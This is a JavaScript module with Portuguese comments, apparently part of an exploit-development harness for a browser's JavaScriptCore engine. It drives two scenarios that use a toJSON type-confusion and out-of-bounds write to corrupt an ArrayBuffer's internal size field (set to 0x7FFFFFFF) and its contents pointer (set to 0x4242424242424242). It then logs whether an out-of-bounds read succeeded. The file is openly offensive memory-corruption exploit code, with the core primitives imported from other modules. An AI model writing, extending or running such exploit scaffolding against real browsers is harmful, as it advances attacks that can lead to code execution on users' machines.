// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
// Importa a função de teste principal e a toJSON de sondagem
import { executeFocusedTestForTypeError, toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; 
import { AdvancedInt64, toHex } from '../utils.mjs';     

async function runTargetedOOBABMetadataExploitation() {
    const FNAME_RUNNER = "runTargetedOOBABMetadataExploitation";
    logS3(`==== INICIANDO Testes de Exploração de Metadados de oob_array_buffer_real via toJSON ====`, 'test', FNAME_RUNNER);

    const size_offset = parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16);
    const contents_ptr_offset = parseInt(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, 16);

    if (isNaN(size_offset) || isNaN(contents_ptr_offset)) {
        logS3("ERRO: Offsets de ArrayBuffer em config.mjs não são válidos!", "error", FNAME_RUNNER);
        return;
    }

    // Cenário A: Tentar Corromper o TAMANHO do oob_array_buffer_real e sondá-lo
    logS3(`\n--- Cenário A: Corromper Tamanho de oob_array_buffer_real @${toHex(size_offset)} para 0x7FFFFFFF ---`, 'subtest', FNAME_RUNNER);
    let resultA = await executeFocusedTestForTypeError(
        "Exploit_CorruptOOBABSize",
        toJSON_AttemptWriteToThis,      // A função toJSON que tentará operar em 'this'
        0x7FFFFFFF,                     // Valor para corromper o tamanho
        size_offset,                    // Offset do campo de tamanho no oob_array_buffer_real
        4                               // Bytes para escrever (tamanho é geralmente 4 bytes)
        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
    );

    logS3(`   Resultado Cenário A (Tamanho): ${resultA.stringifyResult ? JSON.stringify(resultA.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
    if (resultA.stringifyResult?.this_byteLength_prop === 0x7FFFFFFF) {
        logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO A !!!! oob_array_buffer_real.byteLength parece ter sido inflado para 0x7FFFFFFF!`, "critical", FNAME_RUNNER);
        if (resultA.stringifyResult?.oob_read_attempt_val && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Error") && !String(resultA.stringifyResult.oob_read_attempt_val).startsWith("Too small")) {
             logS3(`   !!!! LEITURA OOB EM oob_array_buffer_real BEM-SUCEDIDA !!!! Valor: ${resultA.stringifyResult.oob_read_attempt_val}`, "critical", FNAME_RUNNER);
        }
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    // Cenário B: Tentar Corromper o PONTEIRO de Conteúdo do oob_array_buffer_real e sondá-lo
    logS3(`\n--- Cenário B: Corromper Ponteiro de Conteúdo de oob_array_buffer_real @${toHex(contents_ptr_offset)} para 0x4242424242424242 ---`, 'subtest', FNAME_RUNNER);
    const dummy_ptr_val = new AdvancedInt64("0x4242424242424242");
    let resultB = await executeFocusedTestForTypeError(
        "Exploit_CorruptOOBABContentsPtr",
        toJSON_AttemptWriteToThis,
        dummy_ptr_val,                  // Valor para corromper o ponteiro (AdvancedInt64)
        contents_ptr_offset,            // Offset do campo de ponteiro
        8                               // Bytes para escrever (ponteiro é 8 bytes)
        // O buffer a ser stringificado será o oob_array_buffer_real interno da função chamada
    );
    logS3(`   Resultado Cenário B (Ponteiro): ${resultB.stringifyResult ? JSON.stringify(resultB.stringifyResult) : "N/A"}`, "info", FNAME_RUNNER);
    if (resultB.stringifyResult?.error_in_toJSON && resultB.stringifyResult.error_in_toJSON.includes("DataView Error")) {
         logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView DENTRO da toJSON após corrupção do ponteiro, como esperado!`, "critical", FNAME_RUNNER);
    } else if (resultB.errorOccurred && resultB.errorOccurred.message.includes("DataView")) {
        logS3(`   !!!! SUCESSO POTENCIAL CENÁRIO B !!!! Erro de DataView FORA da toJSON (no stringify) após corrupção do ponteiro!`, "critical", FNAME_RUNNER);
    }

    logS3(`==== Testes de Exploração de Metadados de oob_array_buffer_real CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_TargetedOOBABMetaExploit';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Exploração de Metadados de oob_array_buffer_real via toJSON ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Exploit Meta OOB AB";
    
    await runTargetedOOBABMetadataExploitation();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Exploração de Metadados de oob_array_buffer_real) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("SUCCESS") || document.title.includes("SUCESSO POTENCIAL")) {
        // Manter
    }
    else {
        document.title = "Script 3 Concluído - Exploit Meta OOB AB";
    }
}
